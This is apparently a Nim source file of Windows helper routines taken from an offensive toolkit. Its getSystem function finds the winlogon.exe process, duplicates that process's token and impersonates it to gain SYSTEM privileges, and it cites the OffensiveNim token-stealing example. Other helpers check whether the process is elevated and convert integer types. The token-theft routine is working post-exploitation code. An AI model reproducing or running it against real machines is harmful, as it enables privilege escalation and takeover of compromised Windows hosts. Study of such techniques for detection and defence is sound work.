import winim
import ptr_math
import std/strformat
import strutils

type
  WTS_PROCESS_INFO {.bycopy.} = object
    SessionId: DWORD
    ProcessId: DWORD
    pProcessName: LPSTR
    pUserSid: PSID
  PWTS_PROCESS_INFO* = ptr WTS_PROCESS_INFO

const
  WTS_CURRENT_SERVER_HANDLE = cast[HANDLE](0)

proc WTSEnumerateProcesses(
    hServer: HANDLE,
    Reserved: DWORD,
    Version: DWORD,
    ppProcessInfo: ptr PWTS_PROCESS_INFO,
    pCount: ptr DWORD
): WINBOOL {.importc: "WTSEnumerateProcessesA", dynlib:"Wtsapi32", stdcall.}

proc WTSFreeMemory(pMemory: PVOID): WINBOOL {.importc: "WTSFreeMemory", dynlib:"Wtsapi32", stdcall.}


proc getPid*(): int =
    var
        success: WINBOOL
        processes: ptr WTS_PROCESS_INFO = nil
        pid: DWORD
        count: DWORD = 0

    success = WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &processes, &count)
    for idx in countup(0, count-1):
        if $processes[idx].pProcessName == "winlogon.exe":
            pid = processes[idx].ProcessId
            break
    
    discard WTSFreeMemory(processes)
    return pid.int

proc getSystem*(): bool = 
  let pid: int = getPid()
  # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/token_steal_cmd.nim
  var getproresult = OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid.DWORD)
  if getproresult == 0:
    echo "Failed to open process handle"
    return false

  var prochand: HANDLE
  var resultbool = OpenProcessToken(getproresult,TOKEN_DUPLICATE, addr prochand)
  defer: NtClose(prochand)
  if resultbool == FALSE:
    echo "Failed to open process token"
    return false

  var newtoken: HANDLE
  var dupresult = DuplicateToken(prochand, 2, addr newtoken)
  defer: NtClose(newtoken)
  if bool(dupresult) == FALSE:
    echo "Error duplicating token"
    return false

  var impersonateresult = ImpersonateLoggedOnUser(newtoken)
  if impersonateresult == 0:
    echo "Error calling ImpersonateLoggedOnUser"
    return false

  return true


proc isHighIntegrity*(): bool =
  var token: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr token) == 0:
    echo "Failed to open process token"
    return false
  defer: CloseHandle(token)

  var elevation: TOKEN_ELEVATION
  var retLen: DWORD
  if GetTokenInformation(token, tokenElevation, addr elevation, sizeof(elevation).DWORD, addr retLen) == 0:
    echo "Failed to get token information"
    return false

  return elevation.TokenIsElevated != 0


proc largeIntegerToInt64*(li: LARGE_INTEGER): int64 =
  (int64(li.HighPart) shl 32) + int64(uint32(li.LowPart))


